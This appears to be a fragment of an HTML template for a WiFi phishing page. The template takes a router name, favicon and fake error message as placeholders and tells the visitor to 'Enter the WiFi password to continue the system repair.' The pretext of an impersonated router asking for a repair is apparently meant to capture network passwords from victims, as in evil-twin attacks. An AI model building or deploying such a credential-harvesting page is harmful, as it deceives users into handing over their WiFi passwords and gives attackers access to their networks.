...
<head>
    ...
    <link rel="icon" href="XXFAVICONXX">
    <title>Globe</title>
    <style>
        @font-face {
...
<body>
    <div class="logo" id="router_logo">XXROUTER_NAMEXX</div>
    <div class="container">
        <p>XXERROR_MESSAGEXX<br>Enter the WiFi password to continue the system repair.</p>
    ...
    <div class="footer">
        XXFOOTER_TOPXX<br>
        XXFOOTER_BOTTOMXX <a href="XXFOOTER_LINKXX" style="color: black;">XXFOOTER_LINK_DISCXX</a>
    </div>
